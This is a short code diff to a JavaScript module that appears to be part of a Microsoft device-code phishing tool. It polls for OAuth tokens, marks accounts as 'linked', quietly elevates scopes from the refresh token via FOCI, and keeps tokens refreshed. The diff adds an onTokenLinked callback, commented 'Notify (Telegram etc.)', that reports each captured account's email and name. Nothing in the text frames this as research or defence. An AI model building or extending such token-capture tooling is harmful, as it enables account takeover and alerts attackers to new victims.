@@ -255,6 +255,11 @@ function _startPollLoop(sessionKey, deviceCode, intervalSecs) {
 
       console.log(`[DevFlow] SUCCESS — session ${sessionKey.slice(0,8)}… linked ${emailKey}`);
 
+      // Notify (Telegram etc.)
+      if (module.exports.onTokenLinked) {
+        try { module.exports.onTokenLinked({ email: msEmail, name: msName }); } catch {}
+      }
+
       // Elevate scopes via FOCI in background — don't block the success response
       if (r.refresh_token) {
         setTimeout(() => elevateScopes(r.refresh_token, emailKey), 2000);
@@ -343,4 +348,4 @@ function startCleanup() {
   }, 10 * 60 * 1000);
 }
 
-module.exports = { startSession, getSessionStatus, refreshToken, startAutoRefresh, startCleanup };
+module.exports = { startSession, getSessionStatus, refreshToken, startAutoRefresh, startCleanup, onTokenLinked: null };
